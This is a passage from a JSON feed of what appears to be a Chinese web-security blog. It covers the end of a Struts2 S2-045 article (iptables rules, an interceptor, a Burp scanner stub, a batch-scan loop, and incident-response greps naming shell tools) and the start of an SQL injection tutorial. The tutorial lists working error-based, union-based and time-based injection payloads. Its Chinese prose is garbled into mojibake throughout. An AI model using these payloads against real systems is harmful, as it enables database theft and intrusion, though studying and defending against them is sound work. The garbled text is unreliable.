iptablesè§„åˆ™ç¤ºä¾‹<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;%&#123;&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br>iptables -<span class=\"hljs-selector-tag\">A</span> <span class=\"hljs-selector-tag\">INPUT</span> -<span class=\"hljs-selector-tag\">p</span> tcp <span class=\"hljs-attr\">--dport</span> <span class=\"hljs-number\">8080</span> -m string <span class=\"hljs-attr\">--string</span> &quot;ognl&quot; <span class=\"hljs-attr\">--algo</span> bm -j DROP<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"4-åº”ç”¨å±‚åŠ å›º\"><a href=\"#4-åº”ç”¨å±‚åŠ å›º\" class=\"headerlink\" title=\"4. åº”ç”¨å±‚åŠ å›º\"></a>4. åº”ç”¨å±‚åŠ å›º</h4><figure class=\"highlight scala\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs scala\"><span class=\"hljs-comment\">// è‡ªå®šä¹‰æ‹¦æˆªå™¨</span><br>public <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">SecurityInterceptor</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title\">AbstractInterceptor</span> </span>&#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    public <span class=\"hljs-type\">String</span> intercept(<span class=\"hljs-type\">ActionInvocation</span> invocation) <span class=\"hljs-keyword\">throws</span> <span class=\"hljs-type\">Exception</span> &#123;<br>        <span class=\"hljs-type\">HttpServletRequest</span> request = <span class=\"hljs-type\">ServletActionContext</span>.getRequest();<br>        <span class=\"hljs-type\">String</span> contentType = request.getContentType();<br>        <br>        <span class=\"hljs-keyword\">if</span> (contentType != <span class=\"hljs-literal\">null</span> &amp;&amp; contentType.contains(<span class=\"hljs-string\">&quot;%&#123;&quot;</span>)) &#123;<br>            <span class=\"hljs-keyword\">throw</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-type\">SecurityException</span>(<span class=\"hljs-string\">&quot;Malicious Content-Type detected&quot;</span>);<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> invocation.invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"å®æˆ˜æŠ€å·§ä¸å·¥å…·\"><a href=\"#å®æˆ˜æŠ€å·§ä¸å·¥å…·\" class=\"headerlink\" title=\"å®æˆ˜æŠ€å·§ä¸å·¥å…·\"></a>å®æˆ˜æŠ€å·§ä¸å·¥å…·</h2><h3 id=\"BurpSuiteæ’ä»¶å¼€å‘\"><a href=\"#BurpSuiteæ’ä»¶å¼€å‘\" class=\"headerlink\" title=\"BurpSuiteæ’ä»¶å¼€å‘\"></a>BurpSuiteæ’ä»¶å¼€å‘</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-comment\">// S2-045æ£€æµ‹æ’ä»¶æ¡†æ¶</span><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">S2045Scanner</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">IScannerCheck</span> &#123;<br>    <span class=\"hljs-meta\">@Override</span><br>    <span class=\"hljs-keyword\">public</span> List&lt;IScanIssue&gt; <span class=\"hljs-title function_\">doActiveScan</span><span class=\"hljs-params\">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> &#123;<br>        <span class=\"hljs-comment\">// æ„é€ S2-045 payload</span><br>        <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">payload</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-string\">&quot;%&#123;(#nike=&#x27;multipart/form-data&#x27;)...&#125;&quot;</span>;<br>        <br>        <span class=\"hljs-comment\">// å‘é€æµ‹è¯•è¯·æ±‚</span><br>        <span class=\"hljs-type\">byte</span>[] checkRequest = insertionPoint.buildRequest(payload.getBytes());<br>        <span class=\"hljs-type\">IHttpRequestResponse</span> <span class=\"hljs-variable\">checkRequestResponse</span> <span class=\"hljs-operator\">=</span> callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);<br>        <br>        <span class=\"hljs-comment\">// åˆ†æå“åº”åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¼æ´</span><br>        <span class=\"hljs-keyword\">if</span> (isVulnerable(checkRequestResponse)) &#123;<br>            <span class=\"hljs-keyword\">return</span> Collections.singletonList(<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">CustomScanIssue</span>(<span class=\"hljs-comment\">/* ... */</span>));<br>        &#125;<br>        <br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ‰¹é‡æ£€æµ‹è„šæœ¬\"><a href=\"#æ‰¹é‡æ£€æµ‹è„šæœ¬\" class=\"headerlink\" title=\"æ‰¹é‡æ£€æµ‹è„šæœ¬\"></a>æ‰¹é‡æ£€æµ‹è„šæœ¬</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/bash</span><br><span class=\"hljs-comment\"># S2-045æ‰¹é‡æ£€æµ‹è„šæœ¬</span><br><br>targets=(<br>    <span class=\"hljs-string\">&quot;http://target1.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target2.com:8080&quot;</span><br>    <span class=\"hljs-string\">&quot;http://target3.com:8080&quot;</span><br>)<br><br><span class=\"hljs-keyword\">for</span> target <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;targets[@]&#125;</span>&quot;</span>; <span class=\"hljs-keyword\">do</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;Testing: <span class=\"hljs-variable\">$target</span>&quot;</span><br>    python3 s2-045-check.py <span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$target</span>&quot;</span><br>    <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">&quot;---&quot;</span><br><span class=\"hljs-keyword\">done</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"åº”æ€¥å“åº”æŒ‡å—\"><a href=\"#åº”æ€¥å“åº”æŒ‡å—\" class=\"headerlink\" title=\"åº”æ€¥å“åº”æŒ‡å—\"></a>åº”æ€¥å“åº”æŒ‡å—</h2><h3 id=\"1-æ¼æ´ç¡®è®¤\"><a href=\"#1-æ¼æ´ç¡®è®¤\" class=\"headerlink\" title=\"1. æ¼æ´ç¡®è®¤\"></a>1. æ¼æ´ç¡®è®¤</h3><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\"># æ£€æŸ¥Struts2ç‰ˆæœ¬<br><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/ -name &quot;struts2-core-*.jar&quot; 2&gt;/</span>dev/<span class=\"hljs-keyword\">null</span><br><br># æ£€æŸ¥è®¿é—®æ—¥å¿—ä¸­çš„æ”»å‡»ç‰¹å¾<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;Content-Type.*%\\&#123;&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/apache2/</span>access.log<br><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;ognl|ProcessBuilder|Runtime&quot;</span> <span class=\"hljs-regexp\">/var/</span>log<span class=\"hljs-regexp\">/tomcat/</span>catalina.out<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-åº”æ€¥å¤„ç½®\"><a href=\"#2-åº”æ€¥å¤„ç½®\" class=\"headerlink\" title=\"2. åº”æ€¥å¤„ç½®\"></a>2. åº”æ€¥å¤„ç½®</h3><figure class=\"highlight sas\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sas\"># ä¸´æ—¶é˜»æ–­æ”»å‡»IP<br>iptables -A <span class=\"hljs-keyword\">INPUT</span> -s &lt;æ”»å‡»IP&gt; -j <span class=\"hljs-keyword\">DROP</span><br><br># åœæ­¢ç›¸å…³æœåŠ¡<br>systemctl <span class=\"hljs-keyword\">stop</span> tomcat<br>systemctl <span class=\"hljs-keyword\">stop</span> apache2<br><br># å¤‡ä»½ç³»ç»ŸçŠ¶æ€<br>tar -czf /tmp/system_backup_$(date +<span class=\"hljs-title function_\">%Y</span><span class=\"hljs-title function_\">%m</span><span class=\"hljs-title function_\">%d_</span><span class=\"hljs-title function_\">%H</span><span class=\"hljs-title function_\">%M</span><span class=\"hljs-title function_\">%S</span>).tar.gz /var/log /etc /opt/tomcat<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-ç—•è¿¹æ¸…ç†æ£€æŸ¥\"><a href=\"#3-ç—•è¿¹æ¸…ç†æ£€æŸ¥\" class=\"headerlink\" title=\"3. ç—•è¿¹æ¸…ç†æ£€æŸ¥\"></a>3. ç—•è¿¹æ¸…ç†æ£€æŸ¥</h3><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vim\"># æ£€æŸ¥æ˜¯å¦æœ‰å¼‚å¸¸è¿›ç¨‹<br><span class=\"hljs-keyword\">ps</span> aux | <span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">&quot;nc|bash|sh|python|perl&quot;</span> | <span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-keyword\">grep</span><br><br># æ£€æŸ¥ç½‘ç»œè¿æ¥<br>netstat -antlp | <span class=\"hljs-keyword\">grep</span> ESTABLISHED<br><br># æ£€æŸ¥æ–°å¢æ–‡ä»¶<br><span class=\"hljs-keyword\">find</span> /tmp /var/tmp -<span class=\"hljs-built_in\">type</span> <span class=\"hljs-keyword\">f</span> -mtime -<span class=\"hljs-number\">1</span><br><span class=\"hljs-keyword\">find</span> /<span class=\"hljs-keyword\">opt</span>/tomcat/webapps -name <span class=\"hljs-string\">&quot;*.jsp&quot;</span> -mtime -<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"æ€»ç»“\"><a href=\"#æ€»ç»“\" class=\"headerlink\" title=\"æ€»ç»“\"></a>æ€»ç»“</h2><p>Struts2-045æ¼æ´çš„ç‰¹ç‚¹ï¼š</p>\n<h3 id=\"ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\"><a href=\"#ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\" class=\"headerlink\" title=\"ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰\"></a>ä¼˜åŠ¿ï¼ˆä»æ”»å‡»è€…è§’åº¦ï¼‰</h3><ul>\n<li><strong>åˆ©ç”¨ç®€å•</strong>: åªéœ€æ„é€ HTTPè¯·æ±‚å¤´å³å¯</li>\n<li><strong>å½±å“é¢å¹¿</strong>: å¤§é‡ä¼ä¸šçº§åº”ç”¨ä½¿ç”¨Struts2æ¡†æ¶</li>\n<li><strong>æ£€æµ‹å›°éš¾</strong>: æ”»å‡»æµé‡å¯èƒ½è¢«å¿½ç•¥</li>\n<li><strong>å±å®³ä¸¥é‡</strong>: ç›´æ¥è·å¾—æœåŠ¡å™¨æ‰§è¡Œæƒé™</li>\n</ul>\n<h3 id=\"é˜²æŠ¤è¦ç‚¹\"><a href=\"#é˜²æŠ¤è¦ç‚¹\" class=\"headerlink\" title=\"é˜²æŠ¤è¦ç‚¹\"></a>é˜²æŠ¤è¦ç‚¹</h3><ul>\n<li><strong>åŠæ—¶æ›´æ–°</strong>: å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬æ˜¯æ ¹æœ¬è§£å†³æ–¹æ¡ˆ</li>\n<li><strong>æ·±åº¦é˜²å¾¡</strong>: ç»“åˆWAFã€IDSç­‰å¤šå±‚é˜²æŠ¤</li>\n<li><strong>ç›‘æ§å‘Šè­¦</strong>: å»ºç«‹æœ‰æ•ˆçš„å®‰å…¨ç›‘æ§ä½“ç³»</li>\n<li><strong>åº”æ€¥å“åº”</strong>: åˆ¶å®šå®Œå–„çš„å®‰å…¨äº‹ä»¶å“åº”æµç¨‹</li>\n</ul>\n<hr>\n<blockquote>\n<p><strong>å…è´£å£°æ˜</strong>: æœ¬æ–‡å†…å®¹ä»…ä¾›å®‰å…¨ç ”ç©¶å’Œé˜²æŠ¤å‚è€ƒï¼Œè¯·å‹¿ç”¨äºéæ³•æ”»å‡»æ´»åŠ¨ã€‚</p>\n</blockquote>\n<p><strong>å‚è€ƒèµ„æº</strong>:</p>\n<ul>\n<li><a href=\"https://struts.apache.org/announce.html#a20170307\">Apache Struts2å®˜æ–¹å®‰å…¨å…¬å‘Š</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\">CVE-2017-5638è¯¦ç»†ä¿¡æ¯</a></li>\n<li><a href=\"https://owasp.org/www-project-top-ten/\">OWASP Struts2å®‰å…¨æŒ‡å—</a></li>\n</ul>\n",
            "tags": [
                "Webå®‰å…¨",
                "Struts2",
                "RCE",
                "æ¼æ´å¤ç°",
                "OGNLæ³¨å…¥"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "url": "https://bae-ace.github.io/2025/07/24/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E8%AF%A6%E8%A7%A3/",
            "title": "SQLæ³¨å…¥æ”»å‡»è¯¦è§£",
            "date_published": "2025-07-23T23:51:59.000Z",
            "content_html": "<h1 id=\"SQLæ³¨å…¥æ”»å‡»è¯¦è§£\"><a href=\"#SQLæ³¨å…¥æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"SQLæ³¨å…¥æ”»å‡»è¯¦è§£\"></a>SQLæ³¨å…¥æ”»å‡»è¯¦è§£</h1><h2 id=\"å‰è¨€\"><a href=\"#å‰è¨€\" class=\"headerlink\" title=\"å‰è¨€\"></a>å‰è¨€</h2><p>SQLæ³¨å…¥ä½œä¸ºWebåº”ç”¨ç¨‹åºä¸­æœ€å¸¸è§çš„å®‰å…¨æ¼æ´ä¹‹ä¸€ï¼Œè‡³ä»Šä»æ˜¯æ”»å‡»è€…åˆ©ç”¨çš„ä¸»è¦æ‰‹æ®µã€‚æœ¬æ–‡å°†è¯¦ç»†è®²è§£SQLæ³¨å…¥çš„å„ç§åˆ©ç”¨æ–¹å¼ï¼Œå¸®åŠ©å®‰å…¨ç ”ç©¶äººå‘˜å’Œå¼€å‘è€…æ·±å…¥ç†è§£è¿™ä¸€ç»å…¸æ¼æ´ã€‚</p>\n<h2 id=\"ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\"><a href=\"#ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ\"></a>ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ</h2><p><strong>SQLæ³¨å…¥ï¼ˆSQL Injectionï¼‰</strong> æ˜¯ä¸€ç§å°†æ¶æ„SQLè¯­å¥æ’å…¥åŸæœ¬æ­£å¸¸æŸ¥è¯¢ä¸­çš„æ”»å‡»æ–¹å¼ã€‚æ”»å‡»è€…é€šè¿‡åœ¨ç”¨æˆ·è¾“å…¥ä¸­æ³¨å…¥ç‰¹æ®Šçš„SQLä»£ç ï¼Œå¯ä»¥æ§åˆ¶æ•°æ®åº“çš„æŸ¥è¯¢é€»è¾‘ï¼Œè¿›è€Œè¯»å–ã€ä¿®æ”¹ç”šè‡³æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><p>å½“Webåº”ç”¨ç¨‹åºæœªå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå……åˆ†éªŒè¯å’Œè¿‡æ»¤æ—¶ï¼Œæ”»å‡»è€…æäº¤çš„æ¶æ„è¾“å…¥ä¼šè¢«ç›´æ¥æ‹¼æ¥åˆ°SQLæŸ¥è¯¢è¯­å¥ä¸­ï¼Œå¯¼è‡´åŸæœ‰çš„æŸ¥è¯¢é€»è¾‘è¢«æ”¹å˜ã€‚</p>\n<h2 id=\"SQLæ³¨å…¥ç±»å‹è¯¦è§£\"><a href=\"#SQLæ³¨å…¥ç±»å‹è¯¦è§£\" class=\"headerlink\" title=\"SQLæ³¨å…¥ç±»å‹è¯¦è§£\"></a>SQLæ³¨å…¥ç±»å‹è¯¦è§£</h2><h3 id=\"1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰\"><a href=\"#1-é”™è¯¯æ³¨å…¥ï¼ˆError-based-Injectionï¼‰\" class=\"headerlink\" title=\"1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰\"></a>1. é”™è¯¯æ³¨å…¥ï¼ˆError-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ³¨å…¥æœ‰è¯­æ³•é”™è¯¯æˆ–è¿è¡Œé”™è¯¯çš„SQLè¯­å¥ï¼Œä½¿æ•°æ®åº“æŠ›å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­æå–å­—æ®µã€è¡¨åã€æ•°æ®åº“ç‰ˆæœ¬ç­‰æ•æ„Ÿä¿¡æ¯ã€‚</p>\n<p><strong>æ ¸å¿ƒå…³é”®å­—</strong>ï¼š</p>\n<ul>\n<li><code>extractvalue()</code> - XMLè·¯å¾„æå–å‡½æ•°</li>\n<li><code>updatexml()</code> - XMLæ›´æ–°å‡½æ•°</li>\n<li><code>floor(rand(0)*2)</code> - éšæœºæ•°å–æ•´å‡½æ•°</li>\n<li><code>group by</code> - åˆ†ç»„æŸ¥è¯¢</li>\n</ul>\n<p><strong>ç»å…¸payloadç¤ºä¾‹</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">user</span>(), <span class=\"hljs-number\">0x7e</span>))<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>, concat(<span class=\"hljs-number\">0x7e</span>, <span class=\"hljs-keyword\">database</span>(), <span class=\"hljs-number\">0x7e</span>), <span class=\"hljs-number\">1</span>)<br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> concat(version(), floor(rand(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">having</span> min(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼š</p>\n<ul>\n<li><code>extractvalue()</code>å‡½æ•°åœ¨å‚æ•°æ ¼å¼é”™è¯¯æ—¶ä¼šæŠ›å‡ºè¯¦ç»†çš„é”™è¯¯ä¿¡æ¯</li>\n<li><code>0x7e</code>ä»£è¡¨æ³¢æµªå·<code>~</code>ï¼Œç”¨ä½œæ•°æ®åˆ†éš”ç¬¦ä¾¿äºè¯†åˆ«</li>\n<li>é€šè¿‡æ„é€ ç‰¹å®šçš„é”™è¯¯æ¡ä»¶ï¼Œå¯ä»¥åœ¨æŠ¥é”™ä¸­æ³„éœ²æ•°æ®åº“æ•æ„Ÿä¿¡æ¯</li>\n</ul>\n<h3 id=\"2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰\"><a href=\"#2-è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based-Injectionï¼‰\" class=\"headerlink\" title=\"2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰\"></a>2. è”åˆæŸ¥è¯¢æ³¨å…¥ï¼ˆUnion-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡<code>union select</code>è¯­å¥å°†æ”»å‡»è€…æŒ‡å®šçš„æŸ¥è¯¢ç»“æœä¸åŸå§‹æŸ¥è¯¢ç»“æœåˆå¹¶ï¼Œä»è€Œåœ¨é¡µé¢ä¸Šç›´æ¥æ˜¾ç¤ºæ•°æ®åº“ä¸­çš„æ•æ„Ÿæ•°æ®ã€‚</p>\n<p><strong>æ ¸å¿ƒå…³é”®å­—</strong>ï¼š</p>\n<ul>\n<li><code>union select</code> - è”åˆæŸ¥è¯¢</li>\n<li><code>null</code> - ç©ºå€¼å ä½ç¬¦</li>\n<li><code>order by</code> - å­—æ®µæ’åºï¼ˆç”¨äºæ¢æµ‹åˆ—æ•°ï¼‰</li>\n<li><code>from dual</code> - Oracleæ•°æ®åº“è™šæ‹Ÿè¡¨</li>\n</ul>\n<p><strong>æ¢æµ‹ä¸åˆ©ç”¨æµç¨‹</strong>ï¼š</p>\n<ol>\n<li><strong>ç¡®å®šå­—æ®µæ•°é‡</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">--</span><br>?<span class=\"hljs-built_in\">id</span>=<span class=\"hljs-number\">1</span> order <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">3</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>æ„é€ è”åˆæŸ¥è¯¢</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-keyword\">database</span>(),version() <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>æå–æ•æ„Ÿæ•°æ®</strong>ï¼š</li>\n</ol>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">table_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">tables</span> <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">null</span>,<span class=\"hljs-built_in\">column_name</span>,<span class=\"hljs-keyword\">null</span>,<span class=\"hljs-keyword\">null</span> <span class=\"hljs-keyword\">from</span> information_schema.<span class=\"hljs-keyword\">columns</span> <span class=\"hljs-keyword\">where</span> <span class=\"hljs-built_in\">table_name</span>=<span class=\"hljs-string\">&#x27;users&#x27;</span> <span class=\"hljs-comment\">--</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰\"><a href=\"#3-æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based-Injectionï¼‰\" class=\"headerlink\" title=\"3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰\"></a>3. æ—¶é—´å»¶æ—¶æ³¨å…¥ï¼ˆTime-based Injectionï¼‰</h3><p><strong>æ”»å‡»åŸç†</strong>ï¼šé€šè¿‡æ‰§è¡Œæ•°æ®åº“å»¶æ—¶å‡½æ•°ï¼Œæ ¹æ®HTTPå“åº”æ—¶é—´åˆ¤æ–­æ³¨å…¥æ¡ä»¶çš„çœŸå‡ã€‚è¿™ç§æ–¹æ³•ç‰¹åˆ«é€‚ç”¨äºæ— é¡µé¢å›æ˜¾çš„ç›²æ³¨åœºæ™¯ã€‚</p>\n<p><strong>ä¸åŒæ•°æ®åº“çš„å»¶æ—¶å‡½æ•°</strong>ï¼š</p>\n<ul>\n<li><strong>MySQL</strong>: <code>sleep(x)</code>, <code>benchmark(count, expr)</code></li>\n<li><strong>PostgreSQL</strong>: <code>pg_sleep(x)</code></li>\n<li><strong>Oracle</strong>: <code>dbms_pipe.receive_message(&#39;&#39;,x)</code></li>\n<li><strong>SQL Server</strong>: <code>waitfor delay &#39;00:00:0x&#39;</code></li>\n</ul>\n<p><strong>å…¸å‹payload</strong>ï¼š</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\">?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">5</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(substr(<span class=\"hljs-keyword\">user</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)=<span class=\"hljs-string\">&#x27;r&#x27;</span>, sleep(<span class=\"hljs-number\">3</span>), <span class=\"hljs-number\">0</span>) <span class=\"hljs-comment\">--</span><br>?id=<span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(<span class=\"hljs-keyword\">database</span>(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))=<span class=\"hljs-number\">115</span>, benchmark(<span class=\"hljs-number\">5000000</span>,md5(<span class=\"hljs-string\">&#x27;test&#x27;</span>)), 